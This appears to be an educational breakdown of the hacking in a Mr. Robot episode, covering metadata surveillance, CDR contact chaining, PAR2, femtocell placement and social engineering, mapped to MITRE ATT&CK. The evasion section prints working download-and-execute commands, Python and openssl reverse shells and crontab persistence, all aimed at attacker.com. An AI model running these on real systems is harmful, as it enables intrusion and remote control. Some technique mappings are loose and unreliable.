# Season 3, Episode 4: eps3.3_metadata.par2

## Episode Overview

This episode centers on the power of metadata -- data about data -- as both a surveillance tool and an operational vulnerability. The `.par2` (Parchive) file extension references data recovery and redundancy, reflecting the episode's themes of reconstructing truth from fragments. The FBI femtocell deployment plan advances, Angela's long-term manipulation by Whiterose deepens, and the show explores how even encrypted communications leak valuable metadata that can be used for surveillance and pattern analysis.

---

## Hacks & Techniques

### Metadata Analysis for Surveillance

Metadata is "data about data" -- it does not include the content of communications but reveals who communicated with whom, when, for how long, and from where. As former NSA Director Michael Hayden stated: "We kill people based on metadata."

**Types of metadata exploited in the episode:**

**Phone metadata (Call Detail Records / CDRs):**
- Calling and called number
- Call duration
- Timestamp (start and end)
- Cell tower used (location approximation)
- IMSI and IMEI identifiers

**Cell tower logs:**
- Which devices connected to which towers at what times
- Signal strength measurements enabling triangulation
- Handover records showing movement between towers

**Internet metadata:**
- Source and destination IP addresses
- Timestamps and session duration
- DNS query logs
- Email headers (To, From, Date, Subject, routing information)
- HTTP headers (User-Agent, Referer, cookies)

```bash
# Analyzing CDR data to build contact graphs
# Sample CDR format: timestamp,calling_number,called_number,duration,tower_id

# Extract all unique contacts for a target number
awk -F',' '$2 == "+15551234567" || $3 == "+15551234567" {print $2,$3}' cdr_data.csv | \
    sort | uniq -c | sort -rn

# Build a timeline of a target's locations via cell tower data
awk -F',' '$2 == "+15551234567" {print $1,$5}' cdr_data.csv | sort

# Identify burner phones through usage pattern correlation
# (Short lifespan, limited contacts, activation/disposal patterns)
# Correlate activation times with known events
```

**Contact chaining (two-hop analysis):**

Intelligence agencies use metadata to build relationship graphs:

```
Target Phone --> Direct Contacts (1st hop) --> Their Contacts (2nd hop)

Example:
+1-555-TARGET
    |-- +1-555-CONTACT-A (called 47 times)
    |       |-- +1-555-PERSON-X
    |       |-- +1-555-PERSON-Y
    |-- +1-555-CONTACT-B (called 12 times)
    |       |-- +1-555-PERSON-Z
    |-- +1-555-BURNER-1 (called 3 times, phone active only 2 days)
            |-- No other contacts (suspicious isolation pattern)
```

### NSA/Snowden Parallels for Metadata Surveillance

The episode draws direct parallels to NSA surveillance programs revealed by Edward Snowden in 2013:

**Section 215 (USA PATRIOT Act) bulk metadata collection:**
- The NSA collected CDRs for virtually all phone calls made within or to/from the United States
- The program collected metadata only (not call content) but enabled comprehensive contact chaining
- A single query could return millions of records through multi-hop analysis

**PRISM program:**
- Collected internet communications metadata (and content) from major technology companies
- Email headers, chat logs, file transfer metadata, and social media interactions

**XKeyscore:**
- NSA's search system for internet metadata and content
- Could search by email address, phone number, IP address, or even keywords in communications

```
NSA Metadata Analysis Pipeline (simplified):
[Raw CDR Collection] --> [MAINWAY Database] --> [Contact Chaining Analysis]
                                                        |
                                                [Social Network Graph]
                                                        |
                                                [Pattern of Life Analysis]
                                                        |
                                                [Targeting Decisions]
```

### Parchive (.par2) Data Recovery

The episode title's `.par2` extension refers to Parchive (Parity Archive Volume Set), a file format used for detecting and repairing data corruption:

- **Reed-Solomon error correction**: PAR2 files contain mathematical redundancy data that can reconstruct missing or damaged portions of a file set
- **Usenet origins**: Originally developed for Usenet binary downloads where individual segments might be lost or corrupted
- **Data recovery applications**: PAR2 concepts apply to recovering data from damaged drives, corrupted backups, or incomplete downloads

```bash
# Creating PAR2 recovery files
par2 create -r10 backup.par2 important_data/*
# Creates recovery files with 10% redundancy

# Verifying file integrity
par2 verify backup.par2

# Repairing corrupted files
par2 repair backup.par2
# Automatically reconstructs damaged files using parity data

# The concept extends to cryptocurrency key recovery
# and the recovery of the E Corp encryption keys
```

### Femtocell Deployment Planning

The plan to deploy the modified femtocell inside the FBI field office advances with detailed operational planning:

**Deployment considerations:**

- **Physical placement**: The femtocell must be close enough to target phones (within approximately 10-50 meters for reliable connection)
- **Power supply**: Requires continuous power; a UPS or battery backup ensures uninterrupted operation
- **Network connection**: Needs broadband internet connectivity to relay intercepted traffic
- **Concealment**: Must be hidden in a location where it will not be discovered during routine sweeps
- **Signal calibration**: Must be tuned to overpower the legitimate cell signal without creating detectable RF anomalies

```
FBI Field Office Floor Plan (conceptual):
+------------------------------------------+
|  Reception    |    Open Office Area       |
|               |                           |
|   [Femtocell  |    Agent Desks            |
|    placement]  |    (target phones here)   |
|               |                           |
|  Conference   |    SCIF (Sensitive        |
|  Rooms        |    Compartmented Info     |
|               |    Facility - no phones)  |
+------------------------------------------+

Effective range: ~30m radius from femtocell
```

### Angela's Psychological Manipulation (Long-Term Social Engineering)

Whiterose's manipulation of Angela represents sophisticated, long-term social engineering -- not a technical hack but an attack on human psychology:

**Manipulation techniques employed:**

1. **Exploiting grief and loss**: Angela lost her mother to toxic waste from the Washington Township plant. Whiterose offers a narrative that this loss can be undone.
2. **Cognitive dissonance exploitation**: Presenting Angela with a worldview so radically different from consensus reality that she must either reject it entirely or restructure her belief system to accommodate it.
3. **Isolation from support networks**: Gradually separating Angela from Elliot, Darlene, and other grounding relationships.
4. **Incremental commitment (foot-in-the-door)**: Each small step Angela takes makes the next larger step seem more reasonable.
5. **Sunk cost manipulation**: After Angela has invested significant emotional and moral capital, walking away feels like admitting everything was for nothing.
6. **Authority and mystique**: Whiterose cultivates an aura of knowledge and power that makes her claims seem plausible.

### IDS/IPS Evasion: Living Off the Land

To avoid detection by E Corp's Intrusion Detection/Prevention Systems, attackers use **Living off the Land Binaries and Scripts (LOLBins/LOLBas)** -- legitimate system tools repurposed for malicious activities:

**Why living off the land works:**

- Legitimate system binaries are whitelisted by application control solutions
- Their execution does not trigger antivirus or EDR alerts
- They are present on every system, requiring no additional tool deployment
- Their legitimate use creates noise that masks malicious use

```powershell
# Windows LOLBins examples used in the episode context

# Download files using certutil (a legitimate certificate utility)
certutil -urlcache -split -f http://attacker.com/payload.exe payload.exe

# Execute code via mshta (HTML Application host)
mshta http://attacker.com/malicious.hta

# Compile and execute C# code inline using csc.exe
# (No need to bring an external binary)
echo 'using System; class P { static void Main() { /* payload */ } }' > payload.cs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:payload.exe payload.cs

# PowerShell download and execute (fileless)
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')"

# Use wmic for process execution
wmic process call create "cmd /c whoami > C:\temp\output.txt"

# Use regsvr32 for script execution (Squiblydoo attack)
regsvr32 /s /n /u /i:http://attacker.com/file.sct scrobj.dll
```

**Linux LOLBins:**

```bash
# Download using curl or wget (present on most systems)
curl -o /tmp/payload http://attacker.com/payload
wget -O /tmp/payload http://attacker.com/payload

# Execute Python one-liner for reverse shell
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Use crontab for persistence
(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/payload") | crontab -

# Use openssl for encrypted reverse shell
openssl s_client -connect attacker.com:4443 -quiet | /bin/sh 2>&1 | openssl s_client -connect attacker.com:4444 -quiet
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| **CDR analysis tools** | Processing call detail records for contact chaining |
| **Cell tower triangulation** | Location tracking through cellular metadata |
| **par2cmdline** | Parchive creation and repair for data recovery |
| **Femtocell (modified)** | Rogue cellular base station for interception |
| **LOLBins (certutil, mshta, wmic, PowerShell)** | Living off the land for IDS/IPS evasion |
| **Python** | Scripting for metadata analysis and exploitation |
| **Wireshark** | Network traffic analysis of femtocell traffic |

---

## Commands Shown

```bash
# Metadata extraction from files
exiftool document.pdf            # Extract PDF metadata
exiftool -all= document.pdf     # Strip all metadata (counter-surveillance)

# Email header analysis
# Extracting routing information from email headers
grep -E "^(Received|From|To|Date|Subject|X-Originating-IP):" email_headers.txt

# Cell tower location lookup
# (Using public databases like OpenCellID)
curl "https://opencellid.org/ajax/searchCell.php?mcc=310&mnc=260&lac=1234&cell_id=5678"

# PAR2 operations
par2 create -r15 recovery.par2 encrypted_keys.dat
par2 verify recovery.par2
par2 repair recovery.par2

# Network monitoring for femtocell traffic
tcpdump -i eth0 -n 'port 500 or port 4500'  # IPsec traffic (IKE)
tcpdump -i eth0 -n 'proto esp'               # Encrypted ESP traffic
```

---

## Real-World Parallels

### NSA Metadata Collection
- **Snowden revelations (2013)**: Exposed the NSA's bulk collection of phone metadata under Section 215, collecting records of billions of phone calls made by Americans.
- **Smith v. Maryland (1979)**: Supreme Court case establishing that phone metadata (numbers dialed) is not protected by the Fourth Amendment because it is shared with a third party (the phone company).
- **USA FREEDOM Act (2015)**: Reformed Section 215 to end bulk collection, requiring the government to use specific selectors rather than collecting all records.

### Metadata Power
- **"We kill people based on metadata" -- Gen. Michael Hayden**: Former NSA and CIA director acknowledged the lethal targeting power of metadata analysis.
- **MIT Immersion project**: Researchers demonstrated that email metadata alone can reveal social networks, work patterns, and personal relationships in extraordinary detail.
- **Maltego**: Open-source intelligence tool that builds relationship graphs from metadata, widely used by both security researchers and intelligence professionals.

### Living off the Land Attacks
- **LOLBAS Project (lolbas-project.github.io)**: Comprehensive catalog of Windows binaries that can be used for living off the land techniques.
- **APT29 (Cozy Bear)**: Russian intelligence group known for extensive use of LOLBins, particularly PowerShell and WMI, in the SolarWinds campaign.
- **Fileless malware trend**: Major increase in attacks that use only legitimate system tools, driving the development of behavior-based detection (EDR) rather than signature-based detection (traditional AV).

### Social Engineering at Scale
- **Cambridge Analytica (2018)**: Demonstrated how psychological profiling and targeted manipulation could be conducted at massive scale, echoing Whiterose's individual-level manipulation of Angela.
- **Cult indoctrination techniques**: Whiterose's approach to Angela mirrors documented techniques used by cults and high-control groups: isolation, love-bombing, cognitive overload, and incremental commitment.

## Tool Links

- [Wireshark](https://www.wireshark.org/) - Network traffic analysis and protocol metadata
- [Splunk](https://www.splunk.com/) - SIEM platform for metadata and log correlation
- [ELK Stack](https://www.elastic.co/elastic-stack) - Log and metadata analysis stack
- [Nmap](https://nmap.org/) - Network scanning and service discovery
- [Scapy](https://scapy.net/) - Network packet manipulation and analysis
- [Tor](https://www.torproject.org/) - Anonymity network to bypass metadata analysis
- [GnuPG](https://gnupg.org/) - Metadata removal and communication encryption
- [PowerView/PowerSploit](https://github.com/PowerShellMafia/PowerSploit) - LOLBins and evasion tools

## MITRE ATT&CK Mapping

| Episode Technique | MITRE ATT&CK ID | Name | Link |
|---|---|---|---|
| Metadata analysis for surveillance | T1040 | Network Sniffing | https://attack.mitre.org/techniques/T1040/ |
| Contact chaining via CDRs | T1016 | System Network Configuration Discovery | https://attack.mitre.org/techniques/T1016/ |
| Living off the Land (LOLBins) | T1059 | Command and Scripting Interpreter | https://attack.mitre.org/techniques/T1059/ |
| Download via certutil | T1105 | Ingress Tool Transfer | https://attack.mitre.org/techniques/T1105/ |
| Fileless execution via PowerShell | T1059.001 | PowerShell | https://attack.mitre.org/techniques/T1059/001/ |
| Persistence via crontab | T1053 | Scheduled Task/Job | https://attack.mitre.org/techniques/T1053/ |
| Psychological manipulation of Angela | T1566 | Phishing | https://attack.mitre.org/techniques/T1566/ |
| IDS/IPS evasion | T1562 | Impair Defenses | https://attack.mitre.org/techniques/T1562/ |

## References and Further Reading

- **Snowden, Edward (2013)**: Revelations about the NSA metadata collection program under Section 215 of the USA PATRIOT Act
- **Smith v. Maryland, 442 U.S. 735 (1979)**: Supreme Court decision on telephone metadata privacy
- **USA FREEDOM Act (2015)**: Legislative reform that ended bulk metadata collection
- **Gen. Michael Hayden**: "We kill people based on metadata" -- statement on the operational power of metadata analysis
- **MIT Immersion Project**: Research demonstrating the power of email metadata to reveal social networks
- **LOLBAS Project**: https://lolbas-project.github.io/ -- catalog of Windows binaries for Living off the Land techniques
- **Cambridge Analytica Scandal (2018)**: Psychological manipulation at scale using behavioral profiles

## Search Tags

```
tags: [metadata, CDR, contact-chaining, NSA, Snowden, LOLBins, certutil, PowerShell, femtocell, social-engineering, Angela, Whiterose, IDS-evasion, PAR2]
season: 3
episode: 4
mitre: [T1040, T1016, T1059, T1105, T1059.001, T1053, T1566, T1562]
```
